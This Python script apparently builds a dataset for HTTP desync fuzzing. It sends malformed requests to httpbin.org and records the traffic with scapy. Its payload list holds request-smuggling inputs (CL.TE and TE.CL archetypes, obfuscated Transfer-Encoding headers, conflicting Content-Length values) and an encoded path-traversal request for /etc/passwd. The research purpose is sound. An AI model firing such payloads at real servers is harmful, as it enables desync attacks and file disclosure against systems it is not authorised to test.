#!/usr/bin/env python3
"""
HTTP Desync Traffic Collector
-----------------------------
Generates diverse, malformed HTTP requests and captures the raw TCP traffic 
to build a baseline dataset for HTTP Desync (Request Smuggling) fuzzing.
"""

import os
import sys
import time
import threading
import socket
import logging

try:
    from scapy.all import sniff, wrpcap
    from scapy.layers.inet import TCP
except ImportError:
    print("[!] Error: 'scapy' library is missing.")
    print("[!] Please install it using: sudo pip3 install scapy")
    sys.exit(1)

# Configure basic logging for professional output
logging.basicConfig(level=logging.INFO, format='%(message)s')
logger = logging.getLogger("TrafficCollector")

PCAP_FILENAME = "raw_pcaps/traffic.pcap"
captured_packet_count = 0

def generate_diverse_traffic():
    """
    Background thread that intentionally crafts and dispatches 
    highly diverse and structurally malformed HTTP requests.
    """
    time.sleep(2)  # Allow sniffer initialization
    
    payloads = [
        # --- 1. BASIC & OBSCURE METHODS ---
        ("httpbin.org", b"GET /get HTTP/1.1\r\nHost: httpbin.org\r\nConnection: close\r\n\r\n"),
        ("httpbin.org", b"PROPFIND / HTTP/1.1\r\nHost: httpbin.org\r\nContent-Length: 0\r\nConnection: close\r\n\r\n"),
        ("httpbin.org", b"REPORT / HTTP/1.1\r\nHost: httpbin.org\r\nConnection: close\r\n\r\n"),
        ("httpbin.org", b"OPTIONS * HTTP/1.1\r\nHost: httpbin.org\r\nConnection: close\r\n\r\n"),
        ("httpbin.org", b"TRACE / HTTP/1.1\r\nHost: httpbin.org\r\nConnection: close\r\n\r\n"),
        
        # --- 2. PROTOCOL VERSION VARIATIONS ---
        ("httpbin.org", b"GET / HTTP/1.0\r\n\r\n"),
        ("httpbin.org", b"GET / HTTP/0.9\r\n\r\n"),
        
        # --- 3. PIPELINING (Smuggling Foundation) ---
        ("httpbin.org", b"GET / HTTP/1.1\r\nHost: httpbin.org\r\n\r\nGET /get HTTP/1.1\r\nHost: httpbin.org\r\nConnection: close\r\n\r\n"),
        
        # --- 4. TE/CL CONFLICTS & OBSCURITY ---
        # Spaced Transfer-Encoding
        ("httpbin.org", b"POST /post HTTP/1.1\r\nHost: httpbin.org\r\nContent-Length: 4\r\nTransfer-Encoding : chunked\r\nConnection: close\r\n\r\n0\r\n\r\n"),
        # Header Folding (Leading space)
        ("httpbin.org", b"POST /post HTTP/1.1\r\nHost: httpbin.org\r\nContent-Length: 4\r\n Transfer-Encoding: chunked\r\nConnection: close\r\n\r\n0\r\n\r\n"),
        # Duplicated TE
        ("httpbin.org", b"POST /post HTTP/1.1\r\nHost: httpbin.org\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: identity\r\nConnection: close\r\n\r\n0\r\n\r\n"),
        # Conflicting Content-Length values
        ("httpbin.org", b"POST /post HTTP/1.1\r\nHost: httpbin.org\r\nContent-Length: 4\r\nContent-Length: 5\r\nConnection: close\r\n\r\n0\r\n\r\n"),
        
        # --- 5. BYTE-LEVEL DELIMITER MUTATIONS ---
        # LF vs CRLF Delimiters
        ("httpbin.org", b"GET / HTTP/1.1\nHost: httpbin.org\nConnection: close\n\n"),
        # Case Obfuscation
        ("httpbin.org", b"GET / HTTP/1.1\r\nHoSt: httpbin.org\r\ncOnNeCtIoN: close\r\n\r\n"),
        
        # --- 6. ADVANCED CHUNKED ENCODING ---
        # Chunk Extension Nullification
        ("httpbin.org", b"POST /post HTTP/1.1\r\nHost: httpbin.org\r\nTransfer-Encoding: chunked\r\nConnection: close\r\n\r\n5;ext=true\r\nABCDE\r\n0\r\n\r\n"),
        # Trailer Headers
        ("httpbin.org", b"POST /post HTTP/1.1\r\nHost: httpbin.org\r\nTransfer-Encoding: chunked\r\nConnection: close\r\n\r\n5\r\nABCDE\r\n0\r\nMy-Trailer: True\r\n\r\n"),
        
        # --- 7. ABSOLUTE & MALFORMED URIs ---
        ("httpbin.org", b"GET http://httpbin.org/get HTTP/1.1\r\nHost: httpbin.org\r\nConnection: close\r\n\r\n"),
        ("httpbin.org", b"GET /%2e%2e/%2e%2e/etc/passwd HTTP/1.1\r\nHost: httpbin.org\r\nConnection: close\r\n\r\n"),

        # --- 8. SMUGGLING ARCHETYPES (CL.TE) ---
        ("httpbin.org", b"POST / HTTP/1.1\r\nHost: httpbin.org\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nX"),
        
        # --- 9. SMUGGLING ARCHETYPES (TE.CL) ---
        ("httpbin.org", b"POST / HTTP/1.1\r\nHost: httpbin.org\r\nContent-Length: 3\r\nTransfer-Encoding: chunked\r\n\r\n5\r\n12345\r\n0\r\n\r\n"),
    ]
    
    logger.info(f"\n[+] TrafficGenerator: Dispatching {len(payloads)} mutated payloads...")
    for host, req in payloads:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2.0)
            ip = socket.gethostbyname(host)
            s.connect((ip, 80))
            s.sendall(req)
            try:
                # Flush the stream slightly to prevent early drops
                s.recv(4096)
            except Exception:
                pass
            s.close()
            time.sleep(0.15)
        except Exception:
            pass
    logger.info("  -> TrafficGenerator: All payloads dispatched successfully.")

def packet_handler(packet):
    """Callback function to process sniffed TCP traffic"""
    global captured_packet_count
    
    if packet.haslayer(TCP) and packet.haslayer("Raw"):
        raw_payload = packet["Raw"].load
        try:
            # Decode using latin-1 to preserve arbitrary bytes gracefully
            http_data = raw_payload.decode('latin-1') 
        except Exception:
            return
            
        # Parse the Start Line seamlessly handling \n and \r\n
        start_line = http_data.split('\n')[0].strip('\r')
        
        valid_methods = ("GET ", "POST ", "PUT ", "DELETE ", "OPTIONS ", "HEAD ", "PATCH ", "PROPFIND ", "REPORT ", "TRACE ")
        
        is_request = http_data.upper().startswith(valid_methods) or "HTTP/" in start_line
        is_response = start_line.startswith("HTTP/")
        
        if is_request or is_response:
            captured_packet_count += 1
            wrpcap(PCAP_FILENAME, packet, append=True)
            
            # Truncate string for clean terminal formatting
            display_str = start_line[:100] + "..." if len(start_line) > 100 else start_line
            label = "Response" if is_response else "Request"
            logger.info(f"    [{label:8}] Intercepted: {display_str}")

def main():
    if os.geteuid() != 0:
        logger.error("[!] Root privileges required to sniff packets natively.")
        logger.error("[!] Please run with sudo: sudo python3 collector.py")
        sys.exit(1)

    os.makedirs("raw_pcaps", exist_ok=True)
    if os.path.exists(PCAP_FILENAME):
        os.remove(PCAP_FILENAME) # Purge old traces
        
    logger.info("=" * 65)
    logger.info(f"[*] Initializing HTTP Desync Fuzzing Collector")
    logger.info(f"[*] Destination PCAP: {PCAP_FILENAME}")
    logger.info("=" * 65)
    
    dispatcher_thread = threading.Thread(target=generate_diverse_traffic)
    dispatcher_thread.daemon = True
    dispatcher_thread.start()
    
    # Block and sniff traffic natively on port 80
    sniff(
        filter="tcp port 80", 
        prn=packet_handler, 
        store=0,
        timeout=12 
    )
    
    logger.info("-" * 65)
    logger.info(f"[√] Task Complete. Captured {captured_packet_count} unique HTTP messages.")
    logger.info(f"[i] Dataset saved at {PCAP_FILENAME} for parser pipeline.")

if __name__ == "__main__":
    main()